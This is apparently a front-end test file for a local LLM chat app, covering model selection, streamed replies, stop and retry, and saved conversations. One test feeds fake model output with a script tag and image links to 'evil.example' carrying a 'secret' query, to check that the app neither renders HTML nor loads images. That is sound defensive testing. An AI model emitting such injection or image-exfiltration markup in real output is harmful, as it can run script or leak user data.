import { act, render, screen, waitFor, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { beforeEach, describe, expect, it } from "vitest";
import { App } from "./app";
import {
  controlledStream,
  conversation,
  installFetch,
  json,
  model,
  modelList,
  overview,
  signedIn,
  sse,
  streamResponse,
  summary,
} from "./test/fake-api";

const MODELS = [model("llama3.2:1b"), model("qwen2.5:0.5b", { isDefault: true }), model("glm-5:cloud", { isRemote: true, isAvailable: false, sizeBytes: null })];
const SEND = "POST /api/conversations/:id/messages/stream";
const REGENERATE = "POST /api/conversations/:id/regenerate/stream";

function baseRoutes() {
  return {
    "GET /api/auth/state": () => json(signedIn()),
    "GET /api/system/overview": () => json(overview()),
    "GET /api/models": () => json(modelList(MODELS)),
    "GET /api/conversations": () => json({ conversations: [] }),
    "POST /api/conversations": () => json(conversation("c1", "New conversation"), 201),
  };
}

async function typeAndSend(text: string) {
  const user = userEvent.setup();
  const box = await screen.findByLabelText("Message");
  await waitFor(() => expect(box).toBeEnabled());
  await user.type(box, text);
  await user.click(screen.getByRole("button", { name: "Send" }));
  return user;
}

describe("App", () => {
  beforeEach(() => {
    window.location.hash = "#/chat";
  });

  it("loads installed models and preselects the configured default", async () => {
    installFetch(baseRoutes());
    render(<App />);

    const select = await screen.findByLabelText("Model");
    await waitFor(() => expect(select).toHaveValue("qwen2.5:0.5b"));
    const options = within(select).getAllByRole("option");
    expect(options.map((o) => o.textContent)).toEqual([
      "llama3.2:1b · 494M",
      "qwen2.5:0.5b · 494M",
      "glm-5:cloud (remote — disabled)",
    ]);
    expect(options[2]).toBeDisabled();
  });

  it("explains how to install a model when none is available and blocks sending", async () => {
    installFetch({
      ...baseRoutes(),
      "GET /api/system/overview": () => json(overview({ usable: 0 })),
      "GET /api/models": () => json(modelList([])),
    });
    render(<App />);

    expect(await screen.findByText("No model installed", { selector: ".notice__title" })).toBeInTheDocument();
    expect(screen.getByText("docker compose exec ollama ollama pull qwen2.5:0.5b")).toBeInTheDocument();
    expect(screen.getByLabelText("Message")).toBeDisabled();
  });

  it("shows a provider-unavailable state", async () => {
    installFetch({
      ...baseRoutes(),
      "GET /api/system/overview": () => json(overview({ reachable: false })),
      "GET /api/models": () =>
        json({ status: 503, detail: "The local inference service is not reachable.", code: "provider_unavailable", retryable: true }, 503),
    });
    render(<App />);

    expect(await screen.findByText("Ollama is not reachable")).toBeInTheDocument();
    expect(screen.getByLabelText("Message")).toBeDisabled();
  });

  it("creates a conversation on first send, updates the URL and renders streamed text incrementally", async () => {
    let stream!: ReturnType<typeof controlledStream>;
    const api = installFetch({
      ...baseRoutes(),
      [SEND]: (init) => {
        stream = controlledStream(init?.signal);
        return stream.response;
      },
    });
    render(<App />);
    await waitFor(() => expect(screen.getByLabelText("Model")).toHaveValue("qwen2.5:0.5b"));

    await typeAndSend("Explain SSE");

    expect(screen.getByText("Explain SSE")).toBeInTheDocument();
    await waitFor(() => expect(api.callsTo(SEND)).toHaveLength(1));
    expect(api.callsTo("POST /api/conversations")).toHaveLength(1);
    expect(api.callsTo(SEND)[0]!.key).toBe("POST /api/conversations/c1/messages/stream");
    expect(JSON.parse(api.callsTo(SEND)[0]!.init!.body as string)).toEqual({ model: "qwen2.5:0.5b", content: "Explain SSE" });
    expect(window.location.hash).toBe("#/chat/c1");
    // The new, still-empty conversation is not re-fetched (that would wipe the optimistic messages).
    expect(api.callsTo("GET /api/conversations/:id")).toHaveLength(0);

    await act(async () => stream.push(sse("start", { requestId: "r", model: "qwen2.5:0.5b", createdAt: "", conversationId: "c1" }) + sse("delta", { content: "Server-Sent " })));
    expect(await screen.findByText(/Server-Sent/)).toBeInTheDocument();
    expect(screen.getByText("Streaming")).toBeInTheDocument();

    await act(async () => stream.push(sse("delta", { content: "**Events**" })));
    expect(await screen.findByText("Events", { selector: "strong" })).toBeInTheDocument();

    await act(async () => {
      stream.push(sse("done", { finishReason: "stop", stats: { completionTokens: 3, tokensPerSecond: 12.5, totalDurationMs: 900, promptTokens: 5, loadDurationMs: 10, generationDurationMs: 240 } }));
      stream.close();
    });
    expect(await screen.findByText("3 tokens · 12.5 tok/s · 900 ms")).toBeInTheDocument();
    expect(screen.queryByText("Streaming")).not.toBeInTheDocument();
    expect(screen.getByRole("button", { name: "Copy response" })).toBeInTheDocument();
    // The history list is refreshed after the turn completes.
    await waitFor(() => expect(api.callsTo("GET /api/conversations").length).toBeGreaterThanOrEqual(2));
  });

  it("prevents duplicate submissions while a generation is running", async () => {
    const api = installFetch({
      ...baseRoutes(),
      [SEND]: (init) => controlledStream(init?.signal).response,
    });
    render(<App />);

    const user = await typeAndSend("first");
    await user.type(screen.getByLabelText("Message"), "second{Enter}");

    expect(screen.queryByRole("button", { name: "Send" })).not.toBeInTheDocument();
    expect(screen.getByRole("button", { name: "Stop" })).toBeInTheDocument();
    await waitFor(() => expect(api.callsTo(SEND)).toHaveLength(1));
    expect(api.callsTo("POST /api/conversations")).toHaveLength(1);
  });

  it("stops a generation, aborts the request and keeps the partial text", async () => {
    let stream!: ReturnType<typeof controlledStream>;
    let signal: AbortSignal | null | undefined;
    installFetch({
      ...baseRoutes(),
      [SEND]: (init) => {
        signal = init?.signal;
        stream = controlledStream(signal);
        return stream.response;
      },
    });
    render(<App />);

    const user = await typeAndSend("Count to 100");
    await waitFor(() => expect(stream).toBeDefined());
    await act(async () => stream.push(sse("delta", { content: "1, 2, 3" })));
    expect(await screen.findByText("1, 2, 3")).toBeInTheDocument();

    await user.click(screen.getByRole("button", { name: "Stop" }));

    expect(signal?.aborted).toBe(true);
    expect(await screen.findByText(/Generation stopped; partial response kept/)).toBeInTheDocument();
    expect(screen.getByText("1, 2, 3")).toBeInTheDocument();
    expect(screen.getByRole("button", { name: "Send" })).toBeInTheDocument();
  });

  it("shows a failed request and retries it through the regenerate endpoint", async () => {
    const api = installFetch({
      ...baseRoutes(),
      [SEND]: () =>
        json({ status: 503, title: "Inference provider unavailable", detail: "The local inference service is not reachable.", code: "provider_unavailable", retryable: true }, 503),
      [REGENERATE]: () => streamResponse(sse("delta", { content: "Recovered" }), sse("done", { finishReason: "stop", stats: null })),
    });
    render(<App />);

    const user = await typeAndSend("Hello");

    const alert = await screen.findByText("Generation failed.");
    expect(alert.closest("[role=alert]")).toHaveTextContent("The local inference service is not reachable.");
    await user.click(screen.getByRole("button", { name: "Retry" }));

    expect(await screen.findByText("Recovered")).toBeInTheDocument();
    expect(screen.queryByText("Generation failed.")).not.toBeInTheDocument();
    expect(api.callsTo(REGENERATE)[0]!.key).toBe("POST /api/conversations/c1/regenerate/stream");
    expect(JSON.parse(api.callsTo(REGENERATE)[0]!.init!.body as string)).toEqual({ model: "qwen2.5:0.5b" });
  });

  it("keeps partial text when the stream fails midway", async () => {
    installFetch({
      ...baseRoutes(),
      [SEND]: () =>
        streamResponse(
          sse("delta", { content: "Partial answer" }),
          sse("error", { code: "provider_timeout", message: "The inference service did not respond within 300 seconds.", retryable: true }),
        ),
    });
    render(<App />);

    await typeAndSend("Long task");

    expect(await screen.findByText(/did not respond within 300 seconds/)).toBeInTheDocument();
    expect(screen.getByText("Partial answer")).toBeInTheDocument();
    expect(screen.getByText("provider_timeout")).toBeInTheDocument();
  });

  it("does not render HTML or load images from model output", async () => {
    installFetch({
      ...baseRoutes(),
      [SEND]: () =>
        streamResponse(
          sse("delta", { content: 'Hi <script>window.__pwned = true</script><img src="https://evil.example/x?d=secret"> ![leak](https://evil.example/p.png)' }),
          sse("done", { finishReason: "stop", stats: null }),
        ),
    });
    const { container } = render(<App />);

    await typeAndSend("test");

    expect(await screen.findByText(/image not loaded: leak/)).toBeInTheDocument();
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("img")).toBeNull();
    expect((window as { __pwned?: boolean }).__pwned).toBeUndefined();
  });
});

describe("Conversation history", () => {
  const saved = conversation("c9", "Earlier chat", [
    { role: "user", content: "What is WAL?" },
    { role: "assistant", content: "Write-ahead logging.", model: "qwen2.5:0.5b", stats: { completionTokens: 4, tokensPerSecond: 50, totalDurationMs: 120, promptTokens: 6, loadDurationMs: null, generationDurationMs: 80 } },
    { role: "user", content: "And journaling?" },
    { role: "assistant", content: "Part", status: "error", model: "qwen2.5:0.5b", error: { code: "provider_timeout", message: "Timed out." } },
  ]);

  function historyRoutes() {
    return {
      ...baseRoutes(),
      "GET /api/conversations": () => json({ conversations: [summary(saved)] }),
      "GET /api/conversations/:id": (_: RequestInit | undefined, p: Record<string, string>) =>
        p.id === "c9" ? json(saved) : json({ status: 404, detail: `Conversation '${p.id}' does not exist.`, code: "conversation_not_found", retryable: false }, 404),
    };
  }

  beforeEach(() => {
    window.location.hash = "#/chat";
  });

  it("lists saved conversations and opens one with its stored messages and errors", async () => {
    installFetch(historyRoutes());
    render(<App />);
    const user = userEvent.setup();

    await user.click(await screen.findByRole("button", { name: /^Earlier chat/ }));

    expect(await screen.findByText("Write-ahead logging.")).toBeInTheDocument();
    expect(window.location.hash).toBe("#/chat/c9");
    expect(screen.getByRole("heading", { name: "Earlier chat" })).toBeInTheDocument();
    expect(screen.getByText("4 tokens · 50.0 tok/s · 120 ms")).toBeInTheDocument();
    expect(screen.getByText("Timed out.", { exact: false })).toBeInTheDocument();
    expect(screen.getByRole("button", { name: "Retry" })).toBeInTheDocument();
  });

  it("restores the conversation from the URL after a reload", async () => {
    window.location.hash = "#/chat/c9";
    installFetch(historyRoutes());
    render(<App />);

    expect(await screen.findByText("What is WAL?")).toBeInTheDocument();
    expect(screen.getByRole("button", { name: /^Earlier chat/ })).toHaveAttribute("aria-current", "page");
  });

  it("sends follow-ups to the open conversation without creating a new one", async () => {
    window.location.hash = "#/chat/c9";
    const api = installFetch({
      ...historyRoutes(),
      [SEND]: () => streamResponse(sse("delta", { content: "Sure." }), sse("done", { finishReason: "stop", stats: null })),
    });
    render(<App />);
    expect(await screen.findByText("What is WAL?")).toBeInTheDocument();

    await typeAndSend("Thanks");

    expect(await screen.findByText("Sure.")).toBeInTheDocument();
    expect(api.callsTo(SEND)[0]!.key).toBe("POST /api/conversations/c9/messages/stream");
    expect(api.callsTo("POST /api/conversations")).toHaveLength(0);
  });

  it("shows a clear state for a conversation that no longer exists", async () => {
    window.location.hash = "#/chat/gone";
    installFetch(historyRoutes());
    render(<App />);

    expect(await screen.findByText("Conversation not found")).toBeInTheDocument();
    expect(screen.getByLabelText("Message")).toBeDisabled();
  });

  it("renames a conversation", async () => {
    const api = installFetch({ ...historyRoutes(), "PATCH /api/conversations/:id": () => new Response(null, { status: 204 }) });
    render(<App />);
    const user = userEvent.setup();

    await user.click(await screen.findByRole("button", { name: "Rename Earlier chat" }));
    const input = screen.getByLabelText("Conversation title");
    await user.clear(input);
    await user.type(input, "WAL notes{Enter}");

    await waitFor(() => expect(api.callsTo("PATCH /api/conversations/:id")).toHaveLength(1));
    expect(JSON.parse(api.callsTo("PATCH /api/conversations/:id")[0]!.init!.body as string)).toEqual({ title: "WAL notes" });
  });

  it("deletes the open conversation after confirmation and returns to a new chat", async () => {
    window.location.hash = "#/chat/c9";
    const api = installFetch({ ...historyRoutes(), "DELETE /api/conversations/:id": () => new Response(null, { status: 204 }) });
    render(<App />);
    const user = userEvent.setup();
    expect(await screen.findByText("What is WAL?")).toBeInTheDocument();

    await user.click(screen.getByRole("button", { name: "Delete Earlier chat" }));
    expect(api.callsTo("DELETE /api/conversations/:id")).toHaveLength(0);
    await user.click(screen.getByRole("button", { name: "Delete" }));

    await waitFor(() => expect(api.callsTo("DELETE /api/conversations/:id")).toHaveLength(1));
    await waitFor(() => expect(window.location.hash).toBe("#/chat"));
    expect(await screen.findByText("Start a conversation")).toBeInTheDocument();
  });
});
